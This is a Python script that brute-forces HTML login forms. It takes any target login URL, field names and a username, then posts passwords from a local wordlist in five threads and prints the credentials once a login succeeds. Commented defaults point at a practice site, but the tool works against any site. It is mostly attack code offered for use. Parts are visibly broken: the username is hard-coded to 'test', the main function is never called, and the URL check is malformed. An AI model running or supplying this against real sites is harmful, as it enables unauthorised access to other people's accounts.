from  html.parser import HTMLParser
import urllib.request
import urllib.parse
import http.cookiejar
import queue
import threading
import sys
import os

try:
    def main_bruteforce():
        threads = 5
        resume_word = None
        headers = {}
        # target_url = "http://testphp.vulnweb.com/login.php"
        # post_url = "http://testphp.vulnweb.com/userinfo.php"
        # username_field = "uname"
        # password_field = "pass"
        # username = test

        print("Note: This script only works for login pages having post form link present.")

        target_url = input("Enter the target's login page link: ")
        post_url = input("Enter the link where the login form is getting submitted: ")
        username_field = input("Enter the name of username input field: ")
        password_field = input("Enter the name of password input field: ")
        username = input("Enter the username of user registered on site: ")

        if not target_url or not post_url or not username_field or not password_field or not username:
            print("\n You didn't enter required Input!")
            sys.exit(1)

        if target_url.startswith("http") or target_url.startswith("https") and post_url.startswith("http") or post_url.startswith("https"):
            
            def build_passwd_q(passwd_file):
                fd = open(passwd_file, "rb")
                passwd_list = fd.readlines()
                fd.close()

                passwd_q = queue.Queue()

                if len(passwd_list):
                    if not resume_word:
                        for passwd in passwd_list:
                            passwd = passwd.decode("utf-8").rstrip()
                            passwd_q.put(passwd)
                    else:
                        resume_found = False
                        for passwd in passwd_list:
                            passwd = passwd.decode("utf-8").rstrip()
                            if passwd == resume_word:
                                resume_found = True
                                passwd_q.put(passwd)
                            else:
                                if resume_found:
                                    passwd_q.put(passwd)
                    return passwd_q

            class BruteForcer():
                def __init__(self, username, passwd_q):
                    self.username = username
                    self.passwd_q = passwd_q
                    self.found = False

                def html_brute_forcer(self):
                    while not passwd_q.empty() and not self.found:
                        cookiejar = http.cookiejar.FileCookieJar("cookies")
                        opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cookiejar))

                        urllib.request.install_opener(opener)

                        request = urllib.request.Request(target_url, headers=headers)
                        response = urllib.request.urlopen(request)

                        page = str(response.read())[2:-1]

                        parsed_html = BruteParser()
                        parsed_html.feed(page)

                        if username_field in parsed_html.parsed_results.keys() and password_field in parsed_html.parsed_results.keys():
                            parsed_html.parsed_results[username_field] = self.username
                            parsed_html.parsed_results[password_field] = self.passwd_q.get()

                            print(f"[*] Attempting {self.username}/{parsed_html.parsed_results[password_field]}")

                            post_data = urllib.parse.urlencode(parsed_html.parsed_results).encode()

                            brute_force_request = urllib.request.Request(post_url, headers=headers)
                            brute_force_response = urllib.request.urlopen(brute_force_request, data=post_data)

                            brute_force_page = str(brute_force_response.read())[2:-1]

                            brute_force_parsed_html = BruteParser()
                            brute_force_parsed_html.feed(brute_force_page)

                            if not brute_force_parsed_html.parsed_results:
                                self.found= True
                                print("[*] Brute-Force Attempt is Successful!")
                                print(f"[*] Username: {self.username}")
                                print(f"[*] Password: {parsed_html.parsed_results[password_field]}")
                                print("[*] Done")
                                os._exit(0)
                        else:
                            print("[!] HTML Page is Invalid")
                            break

                def html_brute_forcer_thread_starter(self):
                    print(f"[*] Brute-Forcing with {threads} threads")
                    for i in range(threads):
                        html_brute_forcer_thread = threading.Thread(target=self.html_brute_forcer)
                        html_brute_forcer_thread.start()

            class BruteParser(HTMLParser):
                def __init__(self):
                    HTMLParser.__init__(self)
                    self.parsed_results = {}

                def handle_starttag(self, tag, attrs):
                    if tag == "input":
                        for name, value in attrs:
                            if name == "name" and value == username_field:
                                self.parsed_results[username_field] = username_field
                            if name == "name" and value == password_field:
                                self.parsed_results[password_field] = password_field


            print("[*] Started HTML Form Brute-Forcer Script")
            print("[*] Building Password Queue")
            passwd_q = build_passwd_q("passwd.txt")
            if passwd_q.qsize():
                print("[*] Password Queue Build Successful")
                attempt_brute_force = BruteForcer("test", passwd_q)
                attempt_brute_force.html_brute_forcer_thread_starter()
            else:
                print("[!] Empty Password File!")
                sys.exit(0)
        else:
            print("\n Please enter links with proper http/https scheme.")
            sys.exit(1)
except Exception as e:
    print("\n\An Error Occurred!")
    sys.exit(1)